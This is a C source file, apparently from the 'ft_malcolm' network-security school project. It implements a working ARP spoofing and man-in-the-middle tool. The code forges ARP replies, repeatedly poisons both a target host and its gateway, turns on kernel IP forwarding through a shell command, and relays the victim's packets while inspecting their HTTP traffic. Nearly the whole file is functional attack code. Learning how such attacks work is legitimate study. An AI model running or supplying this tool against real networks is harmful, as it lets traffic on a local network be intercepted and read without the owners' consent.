#include "ft_malcolm.h"
#include <net/if.h>
#include <time.h>

int wait_for_arp_request(int sockfd, t_args *args, bool verbose)
{
	unsigned char buffer[2048];
	ssize_t		  bytes;

	printf(COLOR_CYAN "[Info] Waiting for ARP request...\n" COLOR_RESET);

	while (1)
	{
		bytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			perror("recvfrom");
			return (1);
		}

		uint16_t ethertype = ntohs(*(uint16_t *)(buffer + 12));
		if (ethertype != ETH_P_ARP)
			continue;
		if (bytes < 42)
			continue; // ARP packet must be at least 42 bytes

		uint16_t opcode
			= ntohs(*(uint16_t *)(buffer + 14 + 6)); // ARP header + opcode
		if (opcode == 1)							 // ARP request
		{
			const unsigned char *target_ip
				= buffer + 14 + 24; // ARP header offset for target IP
			const unsigned char *sender_mac = buffer + 14 + 8; // ARP sender MAC
			const unsigned char *sender_ip = buffer + 14 + 14; // ARP sender IP

			char ip_str[INET_ADDRSTRLEN];
			char sender_ip_str[INET_ADDRSTRLEN];
			char sender_mac_str[18];

			inet_ntop(AF_INET, target_ip, ip_str, sizeof(ip_str));
			inet_ntop(AF_INET, sender_ip, sender_ip_str, sizeof(sender_ip_str));
			snprintf(sender_mac_str, sizeof(sender_mac_str),
					 "%02x:%02x:%02x:%02x:%02x:%02x", sender_mac[0],
					 sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4],
					 sender_mac[5]);

			if (ft_strcmp(ip_str, args->source_ip) == 0)
			{
				printf(COLOR_GREEN
					   "An ARP request has been broadcast.\n" COLOR_RESET);
				printf(COLOR_YELLOW "mac address of request: %s\n" COLOR_RESET,
					   sender_mac_str);
				printf(COLOR_YELLOW "IP address of request: %s\n" COLOR_RESET,
					   sender_ip_str);

				if (verbose)
					print_arp_packet(buffer, bytes);
				return (0);
			}
		}
	}
	return (1); // in theory, this should never happen
}

void parse_mac(const char *str, uint8_t mac[6])
{
	sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2],
		   &mac[3], &mac[4], &mac[5]);
}

void create_arp_packet(unsigned char *packet, t_args *args,
					   const char *sender_mac, const char *spoofed_ip,
					   const char *target_mac, const char *target_ip)
{
	// === Ethernet Header ===
	unsigned char *eth = packet;
	unsigned char *arp = packet + 14;

	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[0], &eth[1],
		   &eth[2], &eth[3], &eth[4], &eth[5]);

	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[6], &eth[7],
		   &eth[8], &eth[9], &eth[10], &eth[11]);

	eth[12] = 0x08; // ARP type
	eth[13] = 0x06;

	// === ARP Header ===
	ft_memset(arp, 0, 28);
	arp[0] = 0x00;
	arp[1] = 0x01; // Hardware type: Ethernet
	arp[2] = 0x08;
	arp[3] = 0x00; // Protocol type: IPv4
	arp[4] = 6;	   // Hardware address size
	arp[5] = 4;	   // Protocol address size
	arp[6] = 0x00;
	arp[7] = 0x02; // Opcode: reply (2)

	// Sender MAC
	sscanf(sender_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[8], &arp[9],
		   &arp[10], &arp[11], &arp[12], &arp[13]);

	// Sender IP
	inet_pton(AF_INET, spoofed_ip, &arp[14]);

	// Target MAC
	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[18], &arp[19],
		   &arp[20], &arp[21], &arp[22], &arp[23]);

	// Target IP
	inet_pton(AF_INET, target_ip, &arp[24]);
}

int send_arp_packet_raw(int sockfd, t_args *args, const unsigned char *packet,
						const char *target_mac)
{
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(args->ifname);
	sll.sll_halen = ETH_ALEN;

	uint8_t dest_mac[6];
	parse_mac(target_mac, dest_mac);
	ft_memcpy(sll.sll_addr, dest_mac, 6);

	if (sendto(sockfd, packet, 42, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
	{
		perror("sendto ARP packet");
		return (1);
	}
	return (0);
}

void send_arp_packet(int sockfd, t_args *args, const char *sender_mac,
					 const char *spoofed_ip, const char *target_mac,
					 const char *target_ip)
{
	unsigned char packet[42];

	create_arp_packet(packet, args, sender_mac, spoofed_ip, target_mac,
					  target_ip);
	send_arp_packet_raw(sockfd, args, packet, target_mac);
}

void send_arp_reply(int sockfd, t_args *args)
{
	send_arp_packet(sockfd, args, args->source_mac, args->source_ip,
					args->target_mac, args->target_ip);

	// Show detailed packet information in verbose mode
	if (args->verbose)
		print_sent_arp_reply(args);
}

static void update_packet_for_forwarding(unsigned char *buffer,
										 const char *dst_ip_str, t_args *args)
{
	// Update destination MAC based on where packet is going
	if (ft_strcmp(dst_ip_str, args->target_ip) == 0)
	{
		// Going to target - use target MAC
		sscanf(args->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[0],
			   &buffer[1], &buffer[2], &buffer[3], &buffer[4], &buffer[5]);
	}
	else
	{
		// Going to gateway - use real gateway MAC
		sscanf(args->source_ip_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[0],
			   &buffer[1], &buffer[2], &buffer[3], &buffer[4], &buffer[5]);
	}

	// Always set source MAC to our attacker MAC (we are the forwarder)
	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &buffer[6],
		   &buffer[7], &buffer[8], &buffer[9], &buffer[10], &buffer[11]);
}

static void forward_packet(int sockfd, unsigned char *buffer, ssize_t bytes,
						   t_args *args)
{
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(args->ifname);
	sll.sll_halen = ETH_ALEN;
	ft_memcpy(sll.sll_addr, buffer, 6); // destination MAC

	sendto(sockfd, buffer, bytes, 0, (struct sockaddr *)&sll, sizeof(sll));
}

void *traffic_forwarding_thread(void *arg)
{
	t_forward_args *fargs = (t_forward_args *)arg;
	unsigned char	buffer[2048];
	ssize_t			bytes;

	printf(COLOR_GREEN "[MITM] Traffic forwarding started\n" COLOR_RESET);

	while (1)
	{
		bytes = recvfrom(fargs->sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			perror("recvfrom in forwarding thread");
			continue;
		}

		uint16_t ethertype = ntohs(*(uint16_t *)(buffer + 12));

		// Handle IP packets for MITM analysis and forwarding
		if (ethertype == ETH_P_IP)
		{
			const unsigned char *ip_header = buffer + 14;
			const unsigned char *src_ip = ip_header + 12;
			const unsigned char *dst_ip = ip_header + 16;

			char src_ip_str[INET_ADDRSTRLEN];
			char dst_ip_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, src_ip, src_ip_str, sizeof(src_ip_str));
			inet_ntop(AF_INET, dst_ip, dst_ip_str, sizeof(dst_ip_str));

			// Analyze ALL traffic from/to our target for web requests
			if (ft_strcmp(src_ip_str, fargs->args->target_ip) == 0
				|| ft_strcmp(dst_ip_str, fargs->args->target_ip) == 0)
			{
				analyze_http_traffic(buffer, bytes);
			}

			// Forward ALL traffic from our target (for internet access)
			if (ft_strcmp(src_ip_str, fargs->args->target_ip) == 0)
			{
				// Traffic FROM target - forward to appropriate destination
				update_packet_for_forwarding(buffer, dst_ip_str, fargs->args);
				forward_packet(fargs->sockfd, buffer, bytes, fargs->args);
			}
			// Forward traffic TO our target
			else if (ft_strcmp(dst_ip_str, fargs->args->target_ip) == 0)
			{
				// Traffic TO target - forward to target
				update_packet_for_forwarding(buffer, dst_ip_str, fargs->args);
				forward_packet(fargs->sockfd, buffer, bytes, fargs->args);
			}
		}
		// Handle ARP packets only in verbose mode and less frequently
		else if (ethertype == ETH_P_ARP && fargs->args->verbose)
		{
			static int arp_count = 0;
			arp_count++;

			if (arp_count % 10 == 1) // Show only every 10th ARP packet
			{
				uint16_t opcode = ntohs(*(uint16_t *)(buffer + 14 + 6));
				printf(COLOR_GREEN "[ARP %s]\n" COLOR_RESET,
					   opcode == 1 ? "Request" : "Reply");
			}
		}
	}
	return NULL;
}

void perform_mitm_attack(int sockfd, t_args *args)
{
	t_forward_args fargs = { sockfd, args };

	// Display initial setup info
	printf(COLOR_GREEN "[MITM] Attack started\n" COLOR_RESET);
	printf(COLOR_CYAN "Target: " COLOR_RESET "%s " COLOR_YELLOW
					  "(%s)" COLOR_RESET " | " COLOR_CYAN
					  "Gateway: " COLOR_RESET "%s " COLOR_YELLOW
					  "(%s)\n" COLOR_RESET,
		   args->target_ip, args->target_mac, args->source_ip,
		   args->source_ip_mac);
	printf(COLOR_YELLOW "Press Ctrl+C to stop\n" COLOR_RESET);
	printf(COLOR_BLUE "[Info] ARP poisoning may take 5-10 seconds to become "
					  "effective...\n" COLOR_RESET);

	// Enable IP forwarding
	system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");

	// Start traffic forwarding thread
	if (pthread_create(&g_forward_thread, NULL, traffic_forwarding_thread,
					   &fargs)
		!= 0)
	{
		perror("pthread_create");
		return;
	}
	g_thread_active = true;

	// Main ARP poisoning loop
	int	   cycle_count = 0;
	time_t last_stats = time(NULL);

	while (1)
	{
		// Send poison packets
		send_arp_packet(sockfd, args, args->source_mac, args->source_ip,
						args->target_mac, args->target_ip);
		send_arp_packet(sockfd, args, args->source_mac, args->target_ip,
						args->source_ip_mac, args->source_ip);

		cycle_count++;

		// Show minimal progress every 30 seconds
		time_t now = time(NULL);
		if (now - last_stats >= 30)
		{
			printf(
				COLOR_YELLOW
				"[MITM] Running... (%d cycles, %d packets sent)\n" COLOR_RESET,
				cycle_count, cycle_count * 2);
			print_traffic_summary();
			last_stats = now;
		}

		sleep(1); // Reduced from 2s to 1s for more aggressive poisoning
	}

	// Cleanup (never reached due to signal handlers)
	if (g_thread_active)
	{
		pthread_cancel(g_forward_thread);
		pthread_join(g_forward_thread, NULL);
		g_thread_active = false;
	}
}
